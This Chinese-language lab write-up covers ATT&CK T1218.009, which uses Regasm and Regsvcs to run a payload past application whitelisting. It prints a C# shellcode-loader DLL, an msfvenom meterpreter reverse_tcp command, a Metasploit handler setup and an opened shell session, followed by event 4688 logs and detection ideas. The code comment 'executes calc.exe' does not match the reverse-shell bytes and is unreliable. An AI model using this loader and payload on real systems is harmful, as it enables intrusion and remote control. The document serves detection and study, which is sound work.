# T11218-009-win-基于白名单Regasm.exe执行payload

## 来自ATT&CK的描述

Windows命令行实用程序Regsvcs和Regasm用于注册.NET COM（组件对象模型）程序集。两者都是微软数字签名的。

攻击者可能会使用Regsvcs和Regasm通过受信任的Windows实用程序来代理执行代码。这两个实用程序都可以通过使用二进制文件中的属性，[ComRegisterFunction]或[ComUnregisterFunction]，来指定应在注册或注销之前分别运行的代码，从而绕过进程白名单。

即使进程在没有足够权限的情况下运行并且执行失败，也将执行具有注册和注销属性的代码。

## 测试案例

Regasm 为程序集注册工具，读取程序集中的元数据，并将所需的项添加到注册表中。RegAsm.exe是Microsoft Corporation开发的合法文件进程。它与Microsoft.NET Assembly Registration Utility相关联。

说明：Regasm.exe所在路径没有被系统添加PATH环境变量中，因此，REGASM命令无法识别。

具体参考微软官方文档：
<https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool>

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

win7默认路径

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe`

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 攻击分析

#### 生成恶意dll的cs文件

下载地址:<https://github.com/222222amor/exp_notes/commit/d3471f1d4617fd5423bb85d41b4ec4f8c72332fc>

```c#
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

/*

Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Create Your Strong Name Key -> key.snk

$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
[OR]
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
//Executes UnRegisterClass If you don't have permissions

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
//This calls the UnregisterClass Method

*/
namespace regsvcser
{

    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass ( string key )
        {
            Console.WriteLine("I shouldn't really execute");
            Shellcode.Exec();
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass ( string key )
        {
            Console.WriteLine("I shouldn't really execute either.");
              Shellcode.Exec();
        }
    }

    public class Shellcode
    {
        public static void Exec()
        {
            // native function's compiled code
            // generated with metasploit
            // executes calc.exe
            byte[] shellcode = new byte[341] { #替换成你自己生成的
            0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
            0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
            0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x7e,0x92,
            0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
            0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
            0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,
            0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,
            0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,
            0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,
            0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,
            0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
            0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,
            0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,
            0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };



            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );


    }

}
```

#### msfvenom生成C#格式的payload

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
```

#### 生成DLL

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.dll  /unsafe C:\Users\Administrator\Desktop\a\regsvcs.cs #keyfile:key.snk 可忽略
```

regsvcs.exe加载或卸载指定dll时该dll必须签名才可执行成功，因此命令中使用的key.snk文件为dll签名文件，是由sn.exe生成的公钥和私钥对，如果没有sn命令你可能需要安装vs或者Microsoft SDKs。命令：`sn.exe -k key.snk`

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploits/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > set AutoRunScript migrate f
AutoRunScript => migrate f
msf5 exploit(multi/handler) > exploit
```

#### 靶机执行payload

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Micropoor.dll

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Sending stage (180291 bytes) to 192.168.126.156
[*] Meterpreter session 2 opened (192.168.126.146:4444 -> 192.168.126.156:49963) at 2020-04-13 17:24:11 +0800
meterpreter > getsid
Server SID: S-1-5-21-3661619627-1912079458-2426250727-500
```

## 测试留痕

经过配置后安全日志能够清晰的记录命令行参数，截取windows安全事件4688进程创建部分内容：

```log
进程信息: #4688-1
新进程 ID:0x9f8
新进程名称:C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0x13c
进程命令行:C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U Micropoor.dll

进程信息: #4688-2
新进程 ID:0x8f0
新进程名称:C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0x13c
进程命令行:C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe  Micropoor.dll
```

## 检测规则/思路

通过进程监控来检测和分析Regsvcs.exe和Regasm.exe的执行和参数。比较Regsvcs.exe和Regasm.exe的近期调用与历史已知合法参数及已执行二进制文件来确定是否有异常和潜在的攻击活动。在Regsvcs.exe或Regasm.exe调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。

## 参考推荐

MITRE-ATT&CK-T1218-009

<https://attack.mitre.org/techniques/T1218/009/>

基于白名单Regasm.exe执行payload

<https://micro8.gitbook.io/micro8/contents-1/71-80/73-ji-yu-bai-ming-dan-regasm.exe-zhi-hang-payload-di-san-ji>

免杀远控专题

<http://sec.nmask.cn/article_content?a_id=8233eefd6b2671799b46d7cbab7ee672>
